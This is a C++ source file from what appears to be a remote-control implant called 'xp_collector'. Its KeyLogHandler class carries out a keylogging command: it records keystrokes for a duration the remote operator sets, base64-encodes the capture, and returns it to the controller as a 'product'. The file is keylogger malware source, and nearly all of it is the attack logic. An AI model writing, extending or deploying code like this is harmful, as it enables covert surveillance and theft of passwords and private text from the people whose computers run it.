#include "KeyLogHandler.h"
#include <Commands/KeyLogCommand.h>
#include <WinUtils.h>
#include <Protocol/ReturnProductRequest.h>
#include <Products/KeyLogProduct.h>
#include <iostream>
#include <base64.hpp>
using namespace xp_collector;

xp_collector::KeyLogHandler::KeyLogHandler(std::string client_id)
    : ICommandHandler(client_id)
{
}

std::unique_ptr<IRequest> xp_collector::KeyLogHandler::handle(std::shared_ptr<BasicCommand>& command)
{
    const auto key_log_command = std::static_pointer_cast<KeyLogCommand>(command);
    const std::string result = windows::log_keys(key_log_command->get_duration());
    const std::string encoded_result = base64::to_base64(result);
    return std::make_unique<ReturnProductRequest>(
        RequestHeader{ RequestType::ReturnProduct, m_client_id },
        command->get_command_id(),
        KeyLogProduct(command->get_command_id(), encoded_result).serialize()
    );
}
